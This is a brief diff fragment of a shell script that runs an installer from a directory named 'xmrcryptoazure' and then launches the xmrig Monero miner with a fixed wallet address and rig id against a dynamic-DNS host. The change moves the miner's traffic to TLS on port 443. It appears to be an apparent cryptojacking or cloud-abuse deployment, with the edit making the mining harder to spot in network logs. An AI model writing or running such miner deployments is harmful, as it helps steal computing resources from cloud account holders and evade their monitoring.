@@ -7,5 +7,5 @@ mv xmrcryptoazure/install.sh $HOME;
 chmod +x install.sh;
 ./install.sh;
 cd $HOME/xmrig/build;
-./xmrig --rig-id=F4 -u 4A6HDgKihpfSUj79i8fNYyPk7C3WR4R1rZYyeEh4P81WQXQHAq74J1KAnUaHMmY1UvEMwkxaCRn1MK4b4CM32wDm5VoUHHw -o larissa.redirectme.net:80 
+./xmrig --rig-id=F4 -u 4A6HDgKihpfSUj79i8fNYyPk7C3WR4R1rZYyeEh4P81WQXQHAq74J1KAnUaHMmY1UvEMwkxaCRn1MK4b4CM32wDm5VoUHHw --tls -o larissa.redirectme.net:443
 "
